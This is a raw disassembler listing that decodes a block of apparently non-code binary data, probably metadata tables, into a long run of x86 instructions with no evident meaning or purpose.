  405667:	08 a6 01 0e 00 14    	or     %ah,0x14000e01(%esi)
  40566d:	09 a6 01 06 00 27    	or     %esp,0x27000601(%esi)
  405673:	0b 51 08             	or     0x8(%ecx),%edx
  405676:	0a 00                	or     (%eax),%al
  405678:	34 0b                	xor    $0xb,%al
  40567a:	50                   	push   %eax
  40567b:	01 0a                	add    %ecx,(%edx)
  40567d:	00 3d 0b 6d 01 0a    	add    %bh,0xa016d0b
  405683:	00 65 0b             	add    %ah,0xb(%ebp)
  405686:	50                   	push   %eax
  405687:	01 06                	add    %eax,(%esi)
  405689:	00 bf 0b af 0b 06    	add    %bh,0x60baf0b(%edi)
  40568f:	00 75 0c             	add    %dh,0xc(%ebp)
  405692:	60                   	pusha
  405693:	0c 06                	or     $0x6,%al
  405695:	00 ab 0c 33 01 06    	add    %ch,0x601330c(%ebx)
  40569b:	00 1f                	add    %bl,(%edi)
  40569d:	0d 33 01 06 00       	or     $0x60133,%eax
  4056a2:	48                   	dec    %eax
  4056a3:	10 33                	adc    %dh,(%ebx)
  4056a5:	01 06                	add    %eax,(%esi)
  4056a7:	00 fa                	add    %bh,%dl
  4056a9:	10 db                	adc    %bl,%bl
  4056ab:	10 06                	adc    %al,(%esi)
  4056ad:	00 0d 11 db 10 06    	add    %cl,0x610db11
  4056b3:	00 f1                	add    %dh,%cl
  4056b5:	11 db                	adc    %ebx,%ebx
  4056b7:	10 06                	adc    %al,(%esi)
  4056b9:	00 f6                	add    %dh,%dh
  4056bb:	12 e4                	adc    %ah,%ah
  4056bd:	12 06                	adc    (%esi),%al
  4056bf:	00 0d 13 e4 12 06    	add    %cl,0x612e413
  4056c5:	00 26                	add    %ah,(%esi)
  4056c7:	13 e4                	adc    %esp,%esp
  4056c9:	12 06                	adc    (%esi),%al
  4056cb:	00 41 13             	add    %al,0x13(%ecx)
  4056ce:	e4 12                	in     $0x12,%al
  4056d0:	06                   	push   %es
  4056d1:	00 5c 13 e4          	add    %bl,-0x1c(%ebx,%edx,1)
  4056d5:	12 06                	adc    (%esi),%al
  4056d7:	00 79 13             	add    %bh,0x13(%ecx)
  4056da:	e4 12                	in     $0x12,%al
  4056dc:	06                   	push   %es
  4056dd:	00 b2 13 92 13 06    	add    %dh,0x6139213(%edx)
  4056e3:	00 d2                	add    %dl,%dl
  4056e5:	13 92 13 06 00 f9    	adc    -0x6fff9ed(%edx),%edx
  4056eb:	13 db                	adc    %ebx,%ebx
  4056ed:	10 06                	adc    %al,(%esi)
  4056ef:	00 13                	add    %dl,(%ebx)
  4056f1:	14 33                	adc    $0x33,%al
  4056f3:	01 06                	add    %eax,(%esi)
  4056f5:	00 28                	add    %ch,(%eax)
  4056f7:	14 db                	adc    $0xdb,%al
  4056f9:	10 06                	adc    %al,(%esi)
  4056fb:	00 37                	add    %dh,(%edi)
  4056fd:	14 33                	adc    $0x33,%al
  4056ff:	01 06                	add    %eax,(%esi)
  405701:	00 4c 14 db          	add    %cl,-0x25(%esp,%edx,1)
  405705:	10 06                	adc    %al,(%esi)
  405707:	00 62 14             	add    %ah,0x14(%edx)
  40570a:	db 10                	fistl  (%eax)
  40570c:	06                   	push   %es
  40570d:	00 6d 14             	add    %ch,0x14(%ebp)
  405710:	33 01                	xor    (%ecx),%eax
  405712:	0e                   	push   %cs
  405713:	00 a6 14 a6 01 0a    	add    %ah,0xa01a614(%esi)
  405719:	00 e8                	add    %ch,%al
  40571b:	14 6d                	adc    $0x6d,%al
  40571d:	01 06                	add    %eax,(%esi)
  40571f:	00 18                	add    %bl,(%eax)
  405721:	15 33 01 16 00       	adc    $0x160133,%eax
  405726:	50                   	push   %eax
  405727:	15 84 08 0e 00       	adc    $0xe0884,%eax
  40572c:	56                   	push   %esi
  40572d:	15 a6 01 0e 00       	adc    $0xe01a6,%eax
  405732:	7f 15                	jg     0x405749
  405734:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405735:	01 0e                	add    %ecx,(%esi)
  405737:	00 9f 15 a6 01 0e    	add    %bl,0xe01a615(%edi)
  40573d:	00 a7 15 a6 01 16    	add    %ah,0x1601a615(%edi)
  405743:	00 b7 15 84 08 0e    	add    %dh,0xe088415(%edi)
  405749:	00 ca                	add    %cl,%dl
  40574b:	15 a6 01 16 00       	adc    $0x1601a6,%eax
  405750:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405751:	05 84 08 16 00       	add    $0x160884,%eax
  405756:	df 04 84             	filds  (%esp,%eax,4)
  405759:	08 e7                	or     %ah,%bh
  40575b:	00 0f                	add    %cl,(%edi)
  40575d:	16                   	push   %ss
  40575e:	00 00                	add    %al,(%eax)
  405760:	06                   	push   %es
  405761:	00 76 16             	add    %dh,0x16(%esi)
  405764:	33 01                	xor    (%ecx),%eax
  405766:	0e                   	push   %cs
  405767:	00 97 16 a6 01 0e    	add    %dl,0xe01a616(%edi)
  40576d:	00 bb 16 a6 01 06    	add    %bh,0x601a616(%ebx)
  405773:	00 df                	add    %bl,%bh
  405775:	16                   	push   %ss
  405776:	e4 12                	in     $0x12,%al
  405778:	16                   	push   %ss
  405779:	00 0a                	add    %cl,(%edx)
  40577b:	17                   	pop    %ss
  40577c:	84 08                	test   %cl,(%eax)
  40577e:	0e                   	push   %cs
  40577f:	00 4e 17             	add    %cl,0x17(%esi)
  405782:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405783:	01 0e                	add    %ecx,(%esi)
  405785:	00 9d 17 a6 01 0e    	add    %bl,0xe01a617(%ebp)
  40578b:	00 a9 17 a6 01 06    	add    %ch,0x601a617(%ecx)
  405791:	00 b1 17 51 08 06    	add    %dh,0x6085117(%ecx)
  405797:	00 28                	add    %ch,(%eax)
  405799:	18 15 18 06 00 3d    	sbb    %dl,0x3d000618
  40579f:	18 33                	sbb    %dh,(%ebx)
  4057a1:	01 06                	add    %eax,(%esi)
  4057a3:	00 6c 18 33          	add    %ch,0x33(%eax,%ebx,1)
  4057a7:	01 0e                	add    %ecx,(%esi)
  4057a9:	00 71 18             	add    %dh,0x18(%ecx)
  4057ac:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4057ad:	01 0a                	add    %ecx,(%edx)
  4057af:	00 05 19 6d 01 16    	add    %al,0x16016d19
  4057b5:	00 68 19             	add    %ch,0x19(%eax)
  4057b8:	84 08                	test   %cl,(%eax)
  4057ba:	0e                   	push   %cs
  4057bb:	00 b8 19 a6 01 12    	add    %bh,0x1201a619(%eax)
  4057c1:	00 03                	add    %al,(%ebx)
  4057c3:	1a 1d 08 16 00 70    	sbb    0x70001608,%bl
  4057c9:	1a 84 08 16 00 7e 1a 	sbb    0x1a7e0016(%eax,%ecx,1),%al
  4057d0:	84 08                	test   %cl,(%eax)
  4057d2:	0e                   	push   %cs
  4057d3:	00 91 1a a6 01 0a    	add    %dl,0xa01a61a(%ecx)
  4057d9:	00 d2                	add    %dl,%dl
  4057db:	1a 50 01             	sbb    0x1(%eax),%dl
  4057de:	12 00                	adc    (%eax),%al
  4057e0:	11 1b                	adc    %ebx,(%ebx)
  4057e2:	fb                   	sti
  4057e3:	1a 06                	sbb    (%esi),%al
  4057e5:	00 91 1b 33 01 06    	add    %dl,0x601331b(%ecx)
  4057eb:	00 a9 1b 33 01 0e    	add    %ch,0xe01331b(%ecx)
  4057f1:	00 ea                	add    %ch,%dl
  4057f3:	1b a6 01 0e 00 0c    	sbb    0xc000e01(%esi),%esp
  4057f9:	1c a6                	sbb    $0xa6,%al
  4057fb:	01 06                	add    %eax,(%esi)
  4057fd:	00 35 1c 33 01 06    	add    %dh,0x601331c
  405803:	00 3a                	add    %bh,(%edx)
  405805:	1c 33                	sbb    $0x33,%al
  405807:	01 06                	add    %eax,(%esi)
  405809:	00 81 1c 33 01 06    	add    %al,0x601331c(%ecx)
  40580f:	00 a1 1c e4 12 06    	add    %ah,0x612e41c(%ecx)
  405815:	00 b1 1c e4 12 06    	add    %dh,0x612e41c(%ecx)
  40581b:	00 be 1c e4 12 06    	add    %bh,0x612e41c(%esi)
  405821:	00 c5                	add    %al,%ch
  405823:	1c e4                	sbb    $0xe4,%al
  405825:	12 06                	adc    (%esi),%al
  405827:	00 ed                	add    %ch,%ch
  405829:	1c 33                	sbb    $0x33,%al
  40582b:	01 06                	add    %eax,(%esi)
  40582d:	00 0d 1d 33 01 06    	add    %cl,0x601331d
  405833:	00 3e                	add    %bh,(%esi)
  405835:	1d 33 01 06 00       	sbb    $0x60133,%eax
  40583a:	5f                   	pop    %edi
  40583b:	1d 33 01 06 00       	sbb    $0x60133,%eax
  405840:	67 1d 33 01 06 00    	addr16 sbb $0x60133,%eax
  405846:	76 1d                	jbe    0x405865
  405848:	33 01                	xor    (%ecx),%eax
  40584a:	06                   	push   %es
  40584b:	00 b1 1d a0 1d 06    	add    %dh,0x61da01d(%ecx)
  405851:	00 dd                	add    %bl,%ch
  405853:	1d 33 01 06 00       	sbb    $0x60133,%eax
  405858:	f3 1d 33 01 06 00    	repz sbb $0x60133,%eax
  40585e:	19 1e                	sbb    %ebx,(%esi)
  405860:	a0 1d 0a 00 2e       	mov    0x2e000a1d,%al
  405865:	1e                   	push   %ds
  405866:	50                   	push   %eax
  405867:	01 06                	add    %eax,(%esi)
  405869:	00 57 1e             	add    %dl,0x1e(%edi)
  40586c:	33 01                	xor    (%ecx),%eax
  40586e:	0a 00                	or     (%eax),%al
  405870:	72 1e                	jb     0x405890
  405872:	50                   	push   %eax
  405873:	01 0a                	add    %ecx,(%edx)
  405875:	00 85 1e 50 01 06    	add    %al,0x601501e(%ebp)
  40587b:	00 c5                	add    %al,%ch
  40587d:	1e                   	push   %ds
  40587e:	a0 1d 06 00 ec       	mov    0xec00061d,%al
  405883:	1e                   	push   %ds
  405884:	33 01                	xor    (%ecx),%eax
  405886:	0a 00                	or     (%eax),%al
  405888:	49                   	dec    %ecx
  405889:	1f                   	pop    %ds
  40588a:	22 1f                	and    (%edi),%bl
  40588c:	0a 00                	or     (%eax),%al
  40588e:	59                   	pop    %ecx
  40588f:	1f                   	pop    %ds
  405890:	22 1f                	and    (%edi),%bl
  405892:	06                   	push   %es
  405893:	00 71 1f             	add    %dh,0x1f(%ecx)
  405896:	a0 1d 0a 00 98       	mov    0x98000a1d,%al
  40589b:	1f                   	pop    %ds
  40589c:	50                   	push   %eax
  40589d:	01 0a                	add    %ecx,(%edx)
  40589f:	00 b7 1f 50 01 06    	add    %dh,0x601501f(%edi)
  4058a5:	00 db                	add    %bl,%bl
  4058a7:	1f                   	pop    %ds
  4058a8:	33 01                	xor    (%ecx),%eax
  4058aa:	06                   	push   %es
  4058ab:	00 09                	add    %cl,(%ecx)
  4058ad:	20 33                	and    %dh,(%ebx)
  4058af:	01 06                	add    %eax,(%esi)
  4058b1:	00 25 20 33 01 0e    	add    %ah,0xe013320
  4058b7:	00 3e                	add    %bh,(%esi)
  4058b9:	20 a6 01 0e 00 50    	and    %ah,0x50000e01(%esi)
  4058bf:	20 a6 01 06 00 77    	and    %ah,0x77000601(%esi)
  4058c5:	20 64 20 06          	and    %ah,0x6(%eax,%eiz,1)
  4058c9:	00 91 20 87 20 06    	add    %dl,0x6208720(%ecx)
  4058cf:	00 b2 20 db 01 06    	add    %dh,0x601db20(%edx)
  4058d5:	00 c4                	add    %al,%ah
  4058d7:	20 87 20 06 00 d1    	and    %al,-0x2efff9e0(%edi)
  4058dd:	20 87 20 06 00 e6    	and    %al,-0x19fff9e0(%edi)
  4058e3:	20 87 20 12 00 21    	and    %al,0x21001220(%edi)
  4058e9:	21 02                	and    %eax,(%edx)
  4058eb:	21 12                	and    %edx,(%edx)
  4058ed:	00 27                	add    %ah,(%edi)
  4058ef:	21 02                	and    %eax,(%edx)
  4058f1:	21 12                	and    %edx,(%edx)
  4058f3:	00 2d 21 02 21 12    	add    %ch,0x12210221
  4058f9:	00 3f                	add    %bh,(%edi)
  4058fb:	21 02                	and    %eax,(%edx)
  4058fd:	21 06                	and    %eax,(%esi)
  4058ff:	00 5a 21             	add    %bl,0x21(%edx)
  405902:	33 01                	xor    (%ecx),%eax
  405904:	12 00                	adc    (%eax),%al
  405906:	77 21                	ja     0x405929
  405908:	02 21                	add    (%ecx),%ah
  40590a:	06                   	push   %es
  40590b:	00 91 21 33 01 06    	add    %dl,0x6013321(%ecx)
  405911:	00 b0 21 33 01 0a    	add    %dh,0xa013321(%eax)
  405917:	00 be 21 50 01 06    	add    %bh,0x6015021(%esi)
  40591d:	00 df                	add    %bl,%bh
  40591f:	21 a0 1d 0a 00 f2    	and    %esp,-0xdfff5e3(%eax)
  405925:	21 50 01             	and    %edx,0x1(%eax)
  405928:	0a 00                	or     (%eax),%al
  40592a:	20 22                	and    %ah,(%edx)
  40592c:	50                   	push   %eax
  40592d:	01 06                	add    %eax,(%esi)
  40592f:	00 47 22             	add    %al,0x22(%edi)
  405932:	92                   	xchg   %eax,%edx
  405933:	13 00                	adc    (%eax),%eax
  405935:	00 00                	add    %al,(%eax)
  405937:	00 01                	add    %al,(%ecx)
  405939:	00 00                	add    %al,(%eax)
  40593b:	00 00                	add    %al,(%eax)
  40593d:	00 01                	add    %al,(%ecx)
  40593f:	00 01                	add    %al,(%ecx)
  405941:	00 00                	add    %al,(%eax)
  405943:	00 10                	add    %dl,(%eax)
  405945:	00 17                	add    %dl,(%edi)
  405947:	00 27                	add    %ah,(%edi)
  405949:	00 05 00 01 00 01    	add    %al,0x1000100
  40594f:	00 0b                	add    %cl,(%ebx)
  405951:	01 11                	add    %edx,(%ecx)
  405953:	00 37                	add    %dh,(%edi)
  405955:	00 00                	add    %al,(%eax)
  405957:	00 09                	add    %cl,(%ecx)
  405959:	00 01                	add    %al,(%ecx)
  40595b:	00 04 00             	add    %al,(%eax,%eax,1)
  40595e:	03 01                	add    (%ecx),%eax
  405960:	00 00                	add    %al,(%eax)
  405962:	43                   	inc    %ebx
  405963:	00 00                	add    %al,(%eax)
  405965:	00 0d 00 06 00 04    	add    %cl,0x4000600
  40596b:	00 02                	add    %al,(%edx)
  40596d:	01 00                	add    %eax,(%eax)
  40596f:	00 50 00             	add    %dl,0x0(%eax)
  405972:	00 00                	add    %al,(%eax)
  405974:	0d 00 18 00 04       	or     $0x4001800,%eax
  405979:	00 02                	add    %al,(%edx)
  40597b:	00 10                	add    %dl,(%eax)
  40597d:	00 63 00             	add    %ah,0x0(%ebx)
  405980:	00 00                	add    %al,(%eax)
  405982:	05 00 21 00 04       	add    $0x4002100,%eax
  405987:	00 00                	add    %al,(%eax)
  405989:	00 10                	add    %dl,(%eax)
  40598b:	00 6c 00 27          	add    %ch,0x27(%eax,%eax,1)
  40598f:	00 11                	add    %dl,(%ecx)
  405991:	00 24 00             	add    %ah,(%eax,%eax,1)
  405994:	05 00 01 00 10       	add    $0x10000100,%eax
  405999:	00 7c 00 27          	add    %bh,0x27(%eax,%eax,1)
  40599d:	00 05 00 27 00 1f    	add    %al,0x1f002700
  4059a3:	00 01                	add    %al,(%ecx)
  4059a5:	00 10                	add    %dl,(%eax)
  4059a7:	00 86 00 27 00 05    	add    %al,0x5002700(%esi)
  4059ad:	00 27                	add    %ah,(%edi)
  4059af:	00 23                	add    %ah,(%ebx)
  4059b1:	00 01                	add    %al,(%ecx)
  4059b3:	00 10                	add    %dl,(%eax)
  4059b5:	00 91 00 27 00 05    	add    %dl,0x5002700(%ecx)
  4059bb:	00 27                	add    %ah,(%edi)
  4059bd:	00 25 00 03 00 10    	add    %ah,0x10000300
  4059c3:	00 9d 00 00 00 15    	add    %bl,0x15000000(%ebp)
  4059c9:	00 27                	add    %ah,(%edi)
  4059cb:	00 29                	add    %ch,(%ecx)
  4059cd:	00 01                	add    %al,(%ecx)
  4059cf:	00 10                	add    %dl,(%eax)
  4059d1:	00 ab 00 27 00 15    	add    %ch,0x15002700(%ebx)
  4059d7:	00 29                	add    %ch,(%ecx)
  4059d9:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4059dc:	0b 01                	or     (%ecx),%eax
  4059de:	10 00                	adc    %al,(%eax)
  4059e0:	b9 00 00 00 09       	mov    $0x9000000,%ecx
  4059e5:	00 2f                	add    %ch,(%edi)
  4059e7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4059ea:	01 00                	add    %eax,(%eax)
  4059ec:	10 00                	adc    %al,(%eax)
  4059ee:	c7 00 27 00 05 00    	movl   $0x50027,(%eax)
  4059f4:	37                   	aaa
  4059f5:	00 34 00             	add    %dh,(%eax,%eax,1)
  4059f8:	03 01                	add    (%ecx),%eax
  4059fa:	00 00                	add    %al,(%eax)
  4059fc:	d4 00                	aam    $0x0
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0d 00 37 00 3a       	or     $0x3a003700,%eax
  405a05:	00 03                	add    %al,(%ebx)
  405a07:	01 00                	add    %eax,(%eax)
  405a09:	00 dd                	add    %bl,%ch
  405a0b:	00 00                	add    %al,(%eax)
  405a0d:	00 0d 00 3d 00 3a    	add    %cl,0x3a003d00
  405a13:	00 00                	add    %al,(%eax)
  405a15:	00 10                	add    %dl,(%eax)
  405a17:	00 e7                	add    %ah,%bh
  405a19:	00 27                	add    %ah,(%edi)
  405a1b:	00 19                	add    %bl,(%ecx)
  405a1d:	00 41 00             	add    %al,0x0(%ecx)
  405a20:	3a 00                	cmp    (%eax),%al
  405a22:	00 00                	add    %al,(%eax)
  405a24:	10 00                	adc    %al,(%eax)
  405a26:	f4                   	hlt
  405a27:	00 27                	add    %ah,(%edi)
  405a29:	00 1d 00 4f 00 4d    	add    %bl,0x4d004f00
  405a2f:	00 02                	add    %al,(%edx)
  405a31:	00 10                	add    %dl,(%eax)
  405a33:	00 ff                	add    %bh,%bh
  405a35:	00 00                	add    %al,(%eax)
  405a37:	00 05 00 55 00 5a    	add    %al,0x5a005500
  405a3d:	00 a0 00 00 00 11    	add    %ah,0x11000000(%eax)
  405a43:	01 27                	add    %esp,(%edi)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 56 00             	add    %dl,0x0(%esi)
  405a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  405a4b:	00 00                	add    %al,(%eax)
  405a4d:	00 10                	add    %dl,(%eax)
  405a4f:	00 22                	add    %ah,(%edx)
  405a51:	01 27                	add    %esp,(%edi)
  405a53:	00 05 00 56 00 73    	add    %al,0x73005600
  405a59:	00 03                	add    %al,(%ebx)
  405a5b:	01 10                	add    %edx,(%eax)
  405a5d:	00 06                	add    %al,(%esi)
  405a5f:	1e                   	push   %ds
  405a60:	00 00                	add    %al,(%eax)
  405a62:	05 00 58 00 7a       	add    $0x7a005800,%eax
  405a67:	00 06                	add    %al,(%esi)
  405a69:	00 50 02             	add    %dl,0x2(%eax)
  405a6c:	39 00                	cmp    %eax,(%eax)
  405a6e:	06                   	push   %es
  405a6f:	00 57 02             	add    %dl,0x2(%edi)
  405a72:	3c 00                	cmp    $0x0,%al
  405a74:	06                   	push   %es
  405a75:	00 62 02             	add    %ah,0x2(%edx)
  405a78:	3f                   	aas
  405a79:	00 06                	add    %al,(%esi)
  405a7b:	00 71 02             	add    %dh,0x2(%ecx)
  405a7e:	3f                   	aas
  405a7f:	00 06                	add    %al,(%esi)
  405a81:	00 80 02 3c 00 06    	add    %al,0x6003c02(%eax)
  405a87:	06                   	push   %es
  405a88:	8a 02                	mov    (%edx),%al
  405a8a:	39 00                	cmp    %eax,(%eax)
  405a8c:	56                   	push   %esi
  405a8d:	80 92 02 42 00 56 80 	adcb   $0x80,0x56004202(%edx)
  405a94:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405a95:	02 42 00             	add    0x0(%edx),%al
  405a98:	56                   	push   %esi
  405a99:	80 b4 02 42 00 56 80 	xorb   $0xca,-0x7fa9ffbe(%edx,%eax,1)
  405aa0:	ca 
  405aa1:	02 42 00             	add    0x0(%edx),%al
  405aa4:	56                   	push   %esi
  405aa5:	80 df 02             	sbb    $0x2,%bh
  405aa8:	42                   	inc    %edx
  405aa9:	00 56 80             	add    %dl,-0x80(%esi)
  405aac:	f3 02 42 00          	repz add 0x0(%edx),%al
  405ab0:	56                   	push   %esi
  405ab1:	80 07 03             	addb   $0x3,(%edi)
  405ab4:	42                   	inc    %edx
  405ab5:	00 56 80             	add    %dl,-0x80(%esi)
  405ab8:	16                   	push   %ss
  405ab9:	03 42 00             	add    0x0(%edx),%eax
  405abc:	56                   	push   %esi
  405abd:	80 28 03             	subb   $0x3,(%eax)
  405ac0:	42                   	inc    %edx
  405ac1:	00 56 80             	add    %dl,-0x80(%esi)
  405ac4:	39 03                	cmp    %eax,(%ebx)
  405ac6:	42                   	inc    %edx
  405ac7:	00 56 80             	add    %dl,-0x80(%esi)
  405aca:	4b                   	dec    %ebx
  405acb:	03 42 00             	add    0x0(%edx),%eax
  405ace:	56                   	push   %esi
  405acf:	80 5d 03 42          	sbbb   $0x42,0x3(%ebp)
  405ad3:	00 56 80             	add    %dl,-0x80(%esi)
  405ad6:	65 03 42 00          	add    %gs:0x0(%edx),%eax
  405ada:	56                   	push   %esi
  405adb:	80 77 03 42          	xorb   $0x42,0x3(%edi)
  405adf:	00 56 80             	add    %dl,-0x80(%esi)
  405ae2:	8b 03                	mov    (%ebx),%eax
  405ae4:	42                   	inc    %edx
  405ae5:	00 56 80             	add    %dl,-0x80(%esi)
  405ae8:	9f                   	lahf
  405ae9:	03 42 00             	add    0x0(%edx),%eax
  405aec:	56                   	push   %esi
  405aed:	80 bb 03 42 00 06 06 	cmpb   $0x6,0x6004203(%ebx)
  405af4:	8a 02                	mov    (%edx),%al
  405af6:	39 00                	cmp    %eax,(%eax)
  405af8:	56                   	push   %esi
  405af9:	80 c9 03             	or     $0x3,%cl
  405afc:	9b                   	fwait
  405afd:	00 56 80             	add    %dl,-0x80(%esi)
  405b00:	d2 03                	rolb   %cl,(%ebx)
  405b02:	9b                   	fwait
  405b03:	00 56 80             	add    %dl,-0x80(%esi)
  405b06:	e2 03                	loop   0x405b0b
  405b08:	9b                   	fwait
  405b09:	00 56 80             	add    %dl,-0x80(%esi)
  405b0c:	fe 03                	incb   (%ebx)
  405b0e:	9b                   	fwait
  405b0f:	00 56 80             	add    %dl,-0x80(%esi)
  405b12:	0e                   	push   %cs
  405b13:	04 9b                	add    $0x9b,%al
  405b15:	00 56 80             	add    %dl,-0x80(%esi)
  405b18:	29 04 9b             	sub    %eax,(%ebx,%ebx,4)
  405b1b:	00 56 80             	add    %dl,-0x80(%esi)
  405b1e:	43                   	inc    %ebx
  405b1f:	04 9b                	add    $0x9b,%al
  405b21:	00 56 80             	add    %dl,-0x80(%esi)
  405b24:	5b                   	pop    %ebx
  405b25:	04 9b                	add    $0x9b,%al
  405b27:	00 06                	add    %al,(%esi)
  405b29:	00 6f 04             	add    %ch,0x4(%edi)
  405b2c:	3f                   	aas
  405b2d:	00 06                	add    %al,(%esi)
  405b2f:	00 74 04 3f          	add    %dh,0x3f(%esp,%eax,1)
  405b33:	00 06                	add    %al,(%esi)
  405b35:	00 7d 04             	add    %bh,0x4(%ebp)
  405b38:	3f                   	aas
  405b39:	00 01                	add    %al,(%ecx)
  405b3b:	00 91 04 c7 00 01    	add    %dl,0x100c704(%ecx)
  405b41:	00 a4 04 c7 00 01 00 	add    %ah,0x100c7(%esp,%eax,1)
  405b48:	52                   	push   %edx
  405b49:	05 f5 00 06 00       	add    $0x600f5,%eax
  405b4e:	c0 07 98             	rolb   $0x98,(%edi)
  405b51:	01 06                	add    %eax,(%esi)
  405b53:	00 cd                	add    %cl,%ch
  405b55:	07                   	pop    %es
  405b56:	9b                   	fwait
  405b57:	01 01                	add    %eax,(%ecx)
  405b59:	00 0c 08             	add    %cl,(%eax,%ecx,1)
  405b5c:	c7 00 01 00 31 08    	movl   $0x8310001,(%eax)
  405b62:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405b63:	01 01                	add    %eax,(%ecx)
  405b65:	00 37                	add    %dh,(%edi)
  405b67:	08 39                	or     %bh,(%ecx)
  405b69:	00 01                	add    %al,(%ecx)
  405b6b:	00 41 08             	add    %al,0x8(%ecx)
  405b6e:	39 00                	cmp    %eax,(%eax)
  405b70:	01 00                	add    %eax,(%eax)
  405b72:	4a                   	dec    %edx
  405b73:	08 98 01 01 00 73    	or     %bl,0x73000101(%eax)
  405b79:	08 aa 01 03 00 00    	or     %ch,0x301(%edx)
  405b7f:	09 d7                	or     %edx,%edi
  405b81:	01 03                	add    %eax,(%ebx)
  405b83:	00 0b                	add    %cl,(%ebx)
  405b85:	09 d7                	or     %edx,%edi
  405b87:	01 03                	add    %eax,(%ebx)
  405b89:	00 20                	add    %ah,(%eax)
  405b8b:	09 db                	or     %ebx,%ebx
  405b8d:	01 03                	add    %eax,(%ebx)
  405b8f:	00 2f                	add    %ch,(%edi)
  405b91:	09 d7                	or     %edx,%edi
  405b93:	01 03                	add    %eax,(%ebx)
  405b95:	00 3f                	add    %bh,(%edi)
  405b97:	09 d7                	or     %edx,%edi
  405b99:	01 03                	add    %eax,(%ebx)
  405b9b:	00 4b 09             	add    %cl,0x9(%ebx)
  405b9e:	39 00                	cmp    %eax,(%eax)
  405ba0:	03 00                	add    (%eax),%eax
  405ba2:	56                   	push   %esi
  405ba3:	09 39                	or     %edi,(%ecx)
  405ba5:	00 03                	add    %al,(%ebx)
  405ba7:	00 67 09             	add    %ah,0x9(%edi)
  405baa:	39 00                	cmp    %eax,(%eax)
  405bac:	06                   	push   %es
  405bad:	06                   	push   %es
  405bae:	8a 02                	mov    (%edx),%al
  405bb0:	ef                   	out    %eax,(%dx)
  405bb1:	01 56 80             	add    %edx,-0x80(%esi)
  405bb4:	bd 09 f2 01 56       	mov    $0x5601f209,%ebp
  405bb9:	80 cf 09             	or     $0x9,%bh
  405bbc:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  405bc0:	de 09                	fimuls (%ecx)
  405bc2:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  405bc6:	ed                   	in     (%dx),%eax
  405bc7:	09 f2                	or     %esi,%edx
  405bc9:	01 56 80             	add    %edx,-0x80(%esi)
  405bcc:	fc                   	cld
  405bcd:	09 f2                	or     %esi,%edx
  405bcf:	01 06                	add    %eax,(%esi)
  405bd1:	06                   	push   %es
  405bd2:	8a 02                	mov    (%edx),%al
  405bd4:	ef                   	out    %eax,(%dx)
  405bd5:	01 56 80             	add    %edx,-0x80(%esi)
  405bd8:	0d 0a 00 02 56       	or     $0x5602000a,%eax
  405bdd:	80 1e 0a             	sbbb   $0xa,(%esi)
  405be0:	00 02                	add    %al,(%edx)
  405be2:	56                   	push   %esi
  405be3:	80 30 0a             	xorb   $0xa,(%eax)
  405be6:	00 02                	add    %al,(%edx)
  405be8:	01 00                	add    %eax,(%eax)
  405bea:	41                   	inc    %ecx
  405beb:	0a 13                	or     (%ebx),%dl
  405bed:	02 06                	add    (%esi),%al
  405bef:	00 47 0a             	add    %al,0xa(%edi)
  405bf2:	c7 00 06 00 5c 0a    	movl   $0xa5c0006,(%eax)
  405bf8:	c7 00 06 00 71 0a    	movl   $0xa710006,(%eax)
  405bfe:	c7 00 06 00 88 0a    	movl   $0xa880006,(%eax)
  405c04:	c7 00 06 00 9f 0a    	movl   $0xa9f0006,(%eax)
  405c0a:	c7 00 06 00 b4 0a    	movl   $0xab40006,(%eax)
  405c10:	c7 00 06 00 c9 0a    	movl   $0xac90006,(%eax)
  405c16:	c7 00 06 00 e0 0a    	movl   $0xae00006,(%eax)
  405c1c:	c7 00 06 00 f7 0a    	movl   $0xaf70006,(%eax)
  405c22:	c7 00 06 00 0f 0b    	movl   $0xb0f0006,(%eax)
  405c28:	c7 00 01 00 90 0b    	movl   $0xb900001,(%eax)
  405c2e:	3f                   	aas
  405c2f:	00 01                	add    %al,(%ecx)
  405c31:	00 9b 0b 3f 00 06    	add    %bl,0x6003f0b(%ebx)
  405c37:	00 1d 0c 63 02 01    	add    %bl,0x102630c
  405c3d:	00 56 0c             	add    %dl,0xc(%esi)
  405c40:	73 02                	jae    0x405c44
  405c42:	01 00                	add    %eax,(%eax)
  405c44:	5d                   	pop    %ebp
  405c45:	0c 77                	or     $0x77,%al
  405c47:	02 01                	add    (%ecx),%al
  405c49:	00 81 0c 7b 02 01    	add    %al,0x1027b0c(%ecx)
  405c4f:	00 95 0c 7b 02 01    	add    %dl,0x1027b0c(%ebp)
  405c55:	00 b0 0c 80 02 01    	add    %dh,0x102800c(%eax)
  405c5b:	00 c5                	add    %al,%ch
  405c5d:	0c 92                	or     $0x92,%al
  405c5f:	02 01                	add    (%ecx),%al
  405c61:	00 cf                	add    %cl,%bh
  405c63:	0d 77 02 01 00       	or     $0x10277,%eax
  405c68:	2f                   	das
  405c69:	10 98 01 01 00 3a    	adc    %bl,0x3a000101(%eax)
  405c6f:	10 39                	adc    %bh,(%ecx)
  405c71:	00 06                	add    %al,(%esi)
  405c73:	00 5d 0c             	add    %bl,0xc(%ebp)
  405c76:	77 02                	ja     0x405c7a
  405c78:	06                   	push   %es
  405c79:	00 2a                	add    %ch,(%edx)
  405c7b:	1e                   	push   %ds
  405c7c:	81 06 00 00 00 00    	addl   $0x0,(%esi)
  405c82:	80 00 91             	addb   $0x91,(%eax)
  405c85:	20 f5                	and    %dh,%ch
  405c87:	01 13                	add    %edx,(%ebx)
  405c89:	00 01                	add    %al,(%ecx)
  405c8b:	00 50 20             	add    %dl,0x20(%eax)
  405c8e:	00 00                	add    %al,(%eax)
  405c90:	00 00                	add    %al,(%eax)
  405c92:	93                   	xchg   %eax,%ebx
  405c93:	00 38                	add    %bh,(%eax)
  405c95:	02 28                	add    (%eax),%ch
  405c97:	00 0b                	add    %cl,(%ebx)
  405c99:	00 2a                	add    %ch,(%edx)
  405c9b:	21 00                	and    %eax,(%eax)
